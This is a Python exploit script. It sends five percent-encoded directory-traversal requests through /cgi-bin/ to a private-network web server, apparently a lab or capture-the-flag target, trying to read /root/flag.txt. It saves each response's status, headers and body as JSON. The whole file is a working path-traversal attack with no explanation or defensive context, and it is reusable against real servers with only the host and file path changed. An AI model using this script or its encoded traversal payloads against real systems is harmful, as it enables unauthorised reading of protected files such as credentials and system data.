import base64
import http.client
import json

HOST = "192.168.5.4"
PORT = 80
DEPTH = 8

prefix = "/cgi-bin/"
variants = [
    ("dot-percent-encoded-dot", prefix + ".%2e/" * DEPTH + "root/flag.txt"),
    ("percent-encoded-dotdot", prefix + "%2e%2e/" * DEPTH + "root/flag.txt"),
    ("literal-dotdot-percent-encoded-slash", prefix + "..%2f" * DEPTH + "root/flag.txt"),
    ("dot-percent-encoded-dot-and-slash", prefix + ".%2e%2f" * DEPTH + "root/flag.txt"),
    ("percent-encoded-dotdot-and-slash", prefix + "%2e%2e%2f" * DEPTH + "root/flag.txt"),
]

results = []
for name, request_target in variants:
    item = {"variant": name, "method": "GET", "request_target": request_target}
    connection = http.client.HTTPConnection(HOST, PORT)
    response = None
    body_parts = []
    try:
        try:
            connection.request(
                "GET",
                request_target,
                headers={"Host": HOST, "User-Agent": "read-only-traversal-assessment/1.0", "Connection": "close"},
            )
        except Exception as exc:
            item["error"] = {"stage": "request", "type": type(exc).__name__, "message": str(exc)}
        else:
            try:
                response = connection.getresponse()
                item["status"] = response.status
                item["reason"] = response.reason
                item["http_version"] = response.version
                item["headers"] = response.getheaders()
            except Exception as exc:
                item["error"] = {"stage": "response_headers", "type": type(exc).__name__, "message": str(exc)}

            if response is not None:
                try:
                    while True:
                        chunk = response.read(65536)
                        if not chunk:
                            break
                        body_parts.append(chunk)
                    item["body_complete"] = True
                except Exception as exc:
                    item["body_complete"] = False
                    item["error"] = {"stage": "response_body", "type": type(exc).__name__, "message": str(exc)}
                body = b"".join(body_parts)
                item["body_length"] = len(body)
                item["body_base64"] = base64.b64encode(body).decode("ascii")
                item["body_utf8"] = body.decode("utf-8", errors="replace")
    finally:
        connection.close()
    results.append(item)

print(json.dumps({"target": f"http://{HOST}:{PORT}", "requested_file": "/root/flag.txt", "traversal_depth": DEPTH, "results": results}, ensure_ascii=False))

